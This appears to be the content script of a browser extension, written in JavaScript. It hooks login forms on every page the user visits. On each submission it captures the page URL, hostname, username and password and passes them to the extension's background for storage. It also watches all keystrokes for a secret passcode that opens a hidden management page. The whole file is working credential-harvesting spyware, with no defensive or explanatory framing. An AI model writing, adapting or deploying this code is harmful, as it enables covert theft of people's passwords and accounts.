function monitorSubmissions() {
  
    var forms = document.getElementsByTagName('form');

    for (var i = 0; i < forms.length; i++) {
      var form = forms[i];
      var fields = form.getElementsByTagName('input');

      // attempt to locate user/pass elements
      for (var j = 0; j < fields.length; j++) {
          var f = fields[j];

          // recognize user/pass form elements
          if (!form._pass && f.type == 'password')
              form._pass = f;
          else if (!form._user && (f.type == 'text' || f.type == 'email'))
              form._user = f;

          // wait until user/pass are found
          if (!(form._user !== undefined && form._pass !== undefined))
              continue;

          // user/pass elements found
          // add event handler to form
          form.onsubmit = function() {
              if (this._user.value && this._pass.value) {
                  // post credentials to background
                  chrome.extension.sendRequest({
                      action: 'queryDatabase',
                      crud: 'create',
                      record: [
                          window.location.href,
                          window.location.hostname,
                          this._user.value,
                          this._pass.value
                      ]
                  });
              }
        };
        break;
    }
  }
}

function monitorKeystrokes() {

    var passcode; // extension passcode
    var progress = 0; // characters of passcode matched

    chrome.storage.local.get('passcode', function(response) {
      passcode = response.passcode.toUpperCase();
    });

    chrome.storage.onChanged.addListener(function(changes, namespace) {
      for (key in changes) {
        if (key == 'passcode')
          passcode = changes[key].newValue.toUpperCase();
      }
    });

    window.addEventListener('keydown', function(event) {

        // compare input with expected charCode
        if (event.which == passcode.charCodeAt(progress)) {

            if (progress == passcode.length - 1) {

                // request to open the `manage` page
                chrome.extension.sendRequest({action: 'openManage'});

            } else {
                progress++;
                return true;
            }
        }

        progress = 0;
    });
}

monitorSubmissions(); // monitor submissions for login credentials
monitorKeystrokes(); // monitor keystrokes for extension passcode
